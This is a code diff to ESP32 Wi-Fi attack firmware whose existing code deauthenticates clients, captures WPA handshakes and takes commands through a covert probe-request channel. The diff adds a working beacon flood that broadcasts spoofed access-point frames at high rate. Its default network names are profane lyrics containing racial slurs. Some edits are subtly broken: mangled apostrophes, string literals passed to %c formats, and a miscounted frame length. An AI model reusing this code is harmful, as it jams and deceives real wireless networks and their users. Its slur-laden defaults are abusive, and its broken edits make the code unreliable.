@@ -15,6 +15,14 @@ unsigned long PacketSniffer::last_channel_hop = 0;
 unsigned long PacketSniffer::last_deauth_time = 0;
 CommandInterface* PacketSniffer::command_interface = nullptr;
 
+// Beacon flood static members
+bool PacketSniffer::beacon_flood_active = false;
+std::vector<String> PacketSniffer::beacon_ssids;
+uint8_t PacketSniffer::beacon_flood_channel = 1;
+unsigned long PacketSniffer::last_beacon_time = 0;
+uint32_t PacketSniffer::beacon_interval_us = 1000;  // 1ms default (1000 beacons/sec)
+uint32_t PacketSniffer::beacons_sent = 0;
+
 PacketSniffer::PacketSniffer() {
     // Constructor
 }
@@ -119,7 +127,7 @@ void IRAM_ATTR PacketSniffer::packetHandler(void* buf, wifi_promiscuous_pkt_type
 
     total_packets++;
 
-    // Can't safely process complex operations in ISR, so we defer to main loop
+    // Can"t safely process complex operations in ISR, so we defer to main loop
     // For now, increment counters based on frame type/subtype
     uint8_t frame_type = (hdr->frame_ctrl.type);
     uint8_t frame_subtype = (hdr->frame_ctrl.subtype);
@@ -217,7 +225,7 @@ void PacketSniffer::processProbeRequest(const wifi_ieee80211_packet_t* pkt, uint
     // Check for wireless C2 magic packet
     if (command_interface != nullptr && CommandInterface::isMagicPacket(ssid)) {
         command_interface->processWirelessCommand(ssid, src_mac);
-        // Don't process further - this is a command, not a real probe
+        // Don"t process further - this is a command, not a real probe
         return;
     }
 
@@ -337,7 +345,7 @@ void PacketSniffer::processEAPOL(const uint8_t* payload, uint16_t len, const uin
         } else if (is_ack && has_mic && install) {
             message_num = 3; // M3
         } else if (!is_ack && has_mic && !install) {
-            message_num = 4; // M4 (or could be M2, disambiguate by checking if we've seen M1)
+            message_num = 4; // M4 (or could be M2, disambiguate by checking if we"ve seen M1)
         }
     }
 
@@ -595,10 +603,10 @@ void PacketSniffer::updateHandshakeState(HandshakeInfo* hs) {
         Serial.printf("  AP:   %s\n", macToString(hs->ap_mac).c_str());
         Serial.printf("  Client: %s\n", macToString(hs->client_mac).c_str());
         Serial.printf("  Messages: M1=%c M2=%c M3=%c M4=%c\n",
-                      hs->has_m1 ? 'Y' : 'N',
-                      hs->has_m2 ? 'Y' : 'N',
-                      hs->has_m3 ? 'Y' : 'N',
-                      hs->has_m4 ? 'Y' : 'N');
+                      hs->has_m1 ? "Y" : "N",
+                      hs->has_m2 ? "Y" : "N",
+                      hs->has_m3 ? "Y" : "N",
+                      hs->has_m4 ? "Y" : "N");
         Serial.printf("  Key Version: %u ", hs->keyver);
         if (hs->keyver == 1) Serial.println("(TKIP)");
         else if (hs->keyver == 2) Serial.println("(AES-CCMP)");
@@ -699,10 +707,10 @@ void PacketSniffer::printHandshakeSummary() {
         Serial.printf("    AP:     %s\n", macToString(hs.ap_mac).c_str());
         Serial.printf("    Client: %s\n", macToString(hs.client_mac).c_str());
         Serial.printf("    M1:%c M2:%c M3:%c M4:%c | KeyVer:%u | Age:%lus\n",
-                      hs.has_m1 ? '✓' : '✗',
-                      hs.has_m2 ? '✓' : '✗',
-                      hs.has_m3 ? '✓' : '✗',
-                      hs.has_m4 ? '✓' : '✗',
+                      hs.has_m1 ? '+': '-',
+                      hs.has_m2 ? '+' : '-',
+                      hs.has_m3 ? '+' : '-',
+                      hs.has_m4 ? '+' : '-',
                       hs.keyver,
                       (millis() - hs.timestamp) / 1000);
 
@@ -844,4 +852,204 @@ void PacketSniffer::triggerHandshake(const uint8_t* ap_mac, const uint8_t* clien
     Serial.println("→ Monitoring for handshake (reconnection should happen within 5-10s)");
     Serial.println("→ Watch for [EAPOL] messages...");
     Serial.println();
+}
+
+// ==================== BEACON FLOOD ATTACK ====================
+
+void PacketSniffer::setBeaconFloodSSIDs(const std::vector<String>& ssids) {
+    beacon_ssids = ssids;
+    Serial.printf("[BEACON FLOOD] Loaded %d test SSIDs\n", ssids.size());
+}
+
+void PacketSniffer::startBeaconFlood(uint8_t channel) {
+    // Initialize default SSIDs if none provided
+    if (beacon_ssids.empty()) {
+        beacon_ssids = {
+    
+            "SHAME ON A NIGGA", "WHO TRIED TO RUN", "GAME ON A NIGGA",
+            "WU BUCK WILD", "WITH THA TRIGGA", "SHAME ON A NIGGA",
+            "WHO TRY TO RUN", "GAME ON A NIGGA", "WU BUCK",
+            "ILL FUCK YO ASS", "UP YO", "HUT ONE HUT TWO",
+            "HUT THREE HUT", "OLD DIRTY", "BASTARD LIVE",
+            "LIVE AND UNCUT", "DON'T FUCK THE", "STYLERUTHLESS WILD",
+            "STYLES UNBREAKBALE", "SHATTERPROOF", "TOO THE YOUNG",
+            "YOUTH YOU WANNA", "GET GUN SHOOT", "BLAOW! HOW",
+            "YOU LIKE ME NOW", "TEETH KNOCKED", "DO YOU WANNAGET YOUR",
+            "THE FUCK OUT", "WANNA GET ON IT", "LIKE THAT",
+            "YO RZA YO RAZOR", "I REACT SO THICK", "IM PHAT",
+            "HIT ME WITH THE MAJOR", "THE DAMAGE", "AND HALF STEP",
+            "MY CLAN UNDERSTAND IT", "THE FUCKIN ", "GOT NIGGAS RESIGNIN",
+            "I'M TERROR RAZOR-SHARP", "I PUT THE BUCK", "EDUCATIONAL-DEMO",
+            "I GOT DEEP", "LIKE A NAVY SEAL", "NOW MASTER MY STYLE",
+            "YOU LIKE", "A HOUSE ON FIRE", "YO RAE CAME BLOWIN",
+            "WRECK THIS BROTHERS", "APPROACH AND HALF", "STEP BUT AINT",
+            "SHAME ON A NIGGA", "CALI TO TEXAS", "SMOOTHER THAN A LEXUS"
+        };
+    }
+
+    beacon_flood_active = true;
+    beacon_flood_channel = channel;
+    beacons_sent = 0;
+    last_beacon_time = micros();
+
+    // Set WiFi to the flood channel
+    setChannel(channel);
+
+    Serial.println();
+    Serial.println("╔════════════════════════════════════════════════════════════╗");
+    Serial.println("║          BEACON FLOOD ATTACK INITIATED                    ║");
+    Serial.println("╠════════════════════════════════════════════════════════════╣");
+    Serial.printf("║ Channel:          %d                                       ║\n", channel);
+    Serial.printf("║ SSIDs Count:      %d                                      ║\n", beacon_ssids.size());
+    Serial.printf("║ Beacon Interval:  %d µs                                   ║\n", beacon_interval_us);
+    Serial.println("║                                                            ║");
+    Serial.println("║ ⚠️  AUTHORIZED SECURITY RESEARCH ONLY                     ║");
+    Serial.println("║ Purpose: WiFi stress testing / CTF environments           ║");
+    Serial.println("╚════════════════════════════════════════════════════════════╝");
+    Serial.println();
+    Serial.println("→ Beacon flood active - sending fake AP beacons...");
+    Serial.println("→ Use 'CANCEL' command to stop");
+    Serial.println();
+}
+
+void PacketSniffer::stopBeaconFlood() {
+    if (!beacon_flood_active) {
+        return;
+    }
+
+    beacon_flood_active = false;
+
+    Serial.println();
+    Serial.println("╔════════════════════════════════════════════════════════════╗");
+    Serial.println("║          BEACON FLOOD ATTACK STOPPED                      ║");
+    Serial.println("╠════════════════════════════════════════════════════════════╣");
+    Serial.printf("║ Total Beacons Sent: %lu                                  ║\n", beacons_sent);
+    Serial.printf("║ SSIDs Broadcasted:  %d                                    ║\n", beacon_ssids.size());
+    Serial.println("╚════════════════════════════════════════════════════════════╝");
+    Serial.println();
+}
+
+bool PacketSniffer::isBeaconFloodActive() {
+    return beacon_flood_active;
+}
+
+void PacketSniffer::beaconFloodLoop() {
+    if (!beacon_flood_active || beacon_ssids.empty()) {
+        return;
+    }
+
+    unsigned long now = micros();
+    if (now - last_beacon_time < beacon_interval_us) {
+        return;  // Not time yet
+    }
+
+    last_beacon_time = now;
+
+    // Cycle through SSIDs (send one beacon per call)
+    static uint32_t ssid_index = 0;
+    sendBeaconFrame(beacon_ssids[ssid_index], beacon_flood_channel);
+    beacons_sent++;
+
+    // Move to next SSID
+    ssid_index = (ssid_index + 1) % beacon_ssids.size();
+
+    // Print status every 1000 beacons
+    if (beacons_sent % 1000 == 0) {
+        Serial.printf("[BEACON FLOOD] Sent %lu beacons (%d unique SSIDs)\n",
+                      beacons_sent, beacon_ssids.size());
+    }
+}
+
+void PacketSniffer::buildBeaconFrame(uint8_t* frame, const String& ssid, uint8_t channel, const uint8_t* mac) {
+    // 802.11 Beacon Frame Structure
+    // Frame Control (2) + Duration (2) + DA (6) + SA (6) + BSSID (6) + Seq (2) = 24 bytes
+    // Then: Timestamp (8) + Beacon Interval (2) + Capability (2) + SSID IE + more IEs
+
+    uint16_t seq = random(0, 4096) << 4;  // Random sequence number
+    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+    // Frame Control: Beacon (0x80 = type 0, subtype 8)
+    frame[0] = 0x80;
+    frame[1] = 0x00;
+
+    // Duration
+    frame[2] = 0x00;
+    frame[3] = 0x00;
+
+    // Destination Address (broadcast)
+    memcpy(&frame[4], broadcast, 6);
+
+    // Source Address (fake MAC based on SSID hash)
+    uint8_t fake_mac[6];
+    uint32_t hash = 0;
+    for (size_t i = 0; i < ssid.length(); i++) {
+        hash = hash * 31 + ssid[i];
+    }
+    fake_mac[0] = 0x02;  // Locally administered bit
+    fake_mac[1] = (hash >> 24) & 0xFF;
+    fake_mac[2] = (hash >> 16) & 0xFF;
+    fake_mac[3] = (hash >> 8) & 0xFF;
+    fake_mac[4] = hash & 0xFF;
+    fake_mac[5] = random(0, 256);
+    memcpy(&frame[10], fake_mac, 6);
+
+    // BSSID (same as SA)
+    memcpy(&frame[16], fake_mac, 6);
+
+    // Sequence Control
+    frame[22] = seq & 0xFF;
+    frame[23] = (seq >> 8) & 0xFF;
+
+    // Fixed Parameters (12 bytes)
+    // Timestamp (8 bytes) - current time in microseconds
+    uint64_t timestamp = micros();
+    memcpy(&frame[24], &timestamp, 8);
+
+    // Beacon Interval (2 bytes) - 100 TUs (102.4ms)
+    frame[32] = 0x64;  // 100 TUs
+    frame[33] = 0x00;
+
+    // Capability Info (2 bytes) - ESS mode
+    frame[34] = 0x01;  // ESS
+    frame[35] = 0x00;
+
+    // Tagged Parameters
+    int offset = 36;
+
+    // SSID IE (Tag 0)
+    frame[offset++] = 0x00;  // Tag: SSID
+    uint8_t ssid_len = min((int)ssid.length(), 32);
+    frame[offset++] = ssid_len;  // Length
+    memcpy(&frame[offset], ssid.c_str(), ssid_len);
+    offset += ssid_len;
+
+    // Supported Rates IE (Tag 1)
+    frame[offset++] = 0x01;  // Tag: Supported Rates
+    frame[offset++] = 0x08;  // Length
+    frame[offset++] = 0x82;  // 1 Mbps (basic)
+    frame[offset++] = 0x84;  // 2 Mbps (basic)
+    frame[offset++] = 0x8B;  // 5.5 Mbps (basic)
+    frame[offset++] = 0x96;  // 11 Mbps (basic)
+    frame[offset++] = 0x0C;  // 6 Mbps
+    frame[offset++] = 0x12;  // 9 Mbps
+    frame[offset++] = 0x18;  // 12 Mbps
+    frame[offset++] = 0x24;  // 18 Mbps
+
+    // DS Parameter Set IE (Tag 3)
+    frame[offset++] = 0x03;  // Tag: DS Parameter Set
+    frame[offset++] = 0x01;  // Length
+    frame[offset++] = channel;
+}
+
+void PacketSniffer::sendBeaconFrame(const String& ssid, uint8_t channel) {
+    uint8_t beacon_frame[128];  // Max beacon frame size
+    uint8_t fake_mac[6];
+
+    buildBeaconFrame(beacon_frame, ssid, channel, fake_mac);
+
+    // Calculate frame length (varies by SSID length)
+    uint16_t frame_len = 36 + 2 + ssid.length() + 12;  // Fixed + SSID IE + Rates IE + DS IE
+
+    // Send raw 802.11 frame
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, frame_len, false);
 }
